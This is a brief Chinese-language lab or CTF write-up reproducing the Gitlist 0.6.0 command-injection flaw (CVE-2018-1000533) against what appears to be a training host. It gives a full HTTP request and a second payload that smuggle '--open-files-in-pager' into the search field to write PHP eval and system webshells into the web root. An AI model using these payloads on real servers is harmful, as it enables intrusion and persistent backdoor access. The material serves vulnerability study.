## 1. 漏洞介绍

gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本中，存在一处命令参数注入问题，可以导致远程命令执行漏洞

[vulhub漏洞复现-Gitlist 0.6.0(cve-2018-1000533)远程命令执行漏洞\_vulhub cve-2018-1000533-CSDN博客](https://blog.csdn.net/weixin_54648419/article/details/120875311)

## 2. 漏洞复现

漏洞测试

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312241750474.png)

写个 shell

```http
POST /example/tree/a/search HTTP/1.1
Host: eci-2zebexjk110kip2d9l72.cloudeci1.ichunqiu.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Origin: http://eci-2zebexjk110kip2d9l72.cloudeci1.ichunqiu.com
Connection: close
Referer: http://eci-2zebexjk110kip2d9l72.cloudeci1.ichunqiu.com/example/
Upgrade-Insecure-Requests: 1

query=--open-files-in-pager=echo '<?php @eval($_POST["cmd"]); ?>' > /var/www/html/test.php;
```

执行完后蚁剑连接

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312241751886.png)

或者浏览器直接读取 flag，但不要直接令 `cmd=cat /flag` ，注意 php 中 eval 和 system 函数的区别。

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312241801498.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312241811555.png)

亦或直接写入 system 函数

```PHP
query=--open-files-in-pager=echo '<?php system($_POST["cmd"]); ?>' > /var/www/html/system.php;
```

![3.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312241801266.png)
